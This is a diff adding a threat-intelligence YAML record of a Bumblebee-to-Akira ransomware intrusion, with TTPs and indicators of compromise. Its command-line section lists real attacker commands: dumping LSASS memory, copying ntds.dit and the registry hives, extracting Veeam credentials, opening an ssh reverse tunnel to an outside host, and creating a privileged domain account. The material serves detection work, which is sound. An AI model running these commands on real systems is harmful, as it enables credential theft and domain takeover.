@@ -1,0 +1,98 @@
+description: Bumblebee malware delivered via trojanized MSI installer, followed by
+  lateral movement, credential dumping, remote access installation, and Akira ransomware
+  deployment.
+attribution: APT group unknown; likely state-sponsored actor
+malware_families:
+- Bumblebee
+- AdaptixC2
+- Akira
+TTPs:
+  processes:
+  - consent.exe
+  - msimg32.dll
+  - AdgNsy.exe
+  - wbadmin.exe
+  - rundll32.exe
+  - ssh
+  - psql.exe
+  - cmd.exe
+  - net.exe
+  - nltest.exe
+  - whoami.exe
+  - systeminfo.exe
+  - net user
+  - net group
+  - Invoke-ShareFinder
+  - locker.exe
+  commandline:
+  - consent.exe
+  - msimg32.dll
+  - AdgNsy.exe
+  - wbadmin.exe start backup -backuptarget:\\\\127.0.0.1\\C$\\ProgramData\\ -include":C:\\windows\\NTDS\\ntds.dit,C:\\windows\\system32\\config\\SYSTEM,C:\\windows\\system32\\config\\SECURITY"
+    -quiet
+  - "ssh [email\_protected] -R *:10400 -p22"
+  - psql.exe -U postgres --csv -d VeeamBackup -w -c "SELECT user_name,password,description,change_time_utc
+    FROM credentials"
+  - 'cmd.exe /Q /c for /f "tokens=1,2 delims= " %%A in ("\"tasklist /fi \"Imagename
+    eq lsass.exe\" | find \"lsass\""") do rundll32.exe C:\\windows\\System32\\comsvcs.dll,
+    #+000024 %%B \\Windows\\Temp\\*.* full'
+  - cmd.exe systeminfo.exe
+  - 'nltest.exe /dclist:'
+  - nltest.exe /domain_trusts
+  - whoami.exe /groups
+  - net.exe group "domain admins" /dom
+  - net.exe group "enterprise admins" /dom
+  - net user backup_EA P@ssw0rd1234 /add /dom
+  - net group "enterprise admins" backup_EA /add /dom
+  powershell: []
+  scripting_engine:
+  - Invoke-ShareFinder
+  registry_keys: []
+  image_load:
+  - consent.exe loaded msimg32.dll
+  network_connections:
+  - process: AdgNsy.exe
+    destination: 109.205.195.211:443
+  - process: AdgNsy.exe
+    destination: 188.40.187.145:443
+  - process: AdgNsy.exe
+    destination: 172.96.137.160:443
+  - process: ssh
+    destination: 193.242.184.150:22
+  - process: FileZilla
+    destination: 185.174.100.203:22
+  file_activity:
+  - C:\\Users\\*\\Desktop\\ManageEngine-OpManager.msi
+  - C:\\ProgramData\\*.msi
+  - C:\\Windows\\Temp\\*.*
+  - C:\\ProgramData\\shares.txt
+  persistence:
+  - 'Domain account creation: backup_DA, backup_EA'
+  - Adding backup_EA to Enterprise Administrators group
+  - RDP session using backup_EA
+  - Installation of RustDesk remote access tool
+  process_relations: {}
+IOCs:
+  hashes:
+  - 186b26df63df3b7334043b47659cba4185c948629d857d47452cc1936f0aa5da
+  - a14506c6fb92a5af88a6a44d273edafe10d69ee3d85c8b2a7ac458a22edf68d2
+  - a6df0b49a5ef9ffd6513bfe061fb60f6d2941a440038e2de8a7aeb1914945331
+  - 6ba5d96e52734cbb9246bcc3decf127f780d48fa11587a1a44880c1f04404d23
+  - de730d969854c3697fd0e0803826b4222f3a14efe47e4c60ed749fff6edce19d
+  - 18b8e6762afd29a09becae283083c74a19fc09db1f2c3412c42f1b0178bc122a
+  ips:
+  - 109.205.195.211
+  - 188.40.187.145
+  - 172.96.137.160
+  - 193.242.184.150
+  - 185.174.100.203
+  domains:
+  - ev2sirbd269o5j.org
+  - 2rxyt9urhq0bgj.org
+  - opmanager.pro
+  - angryipscanner.org
+  - axiscamerastation.org
+  - ip-scanner.org
+reference: https://thedfirreport.com/2025/08/05/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira
+date_of_publication: August 05, 2025
+file_creation_date: October 17, 2025
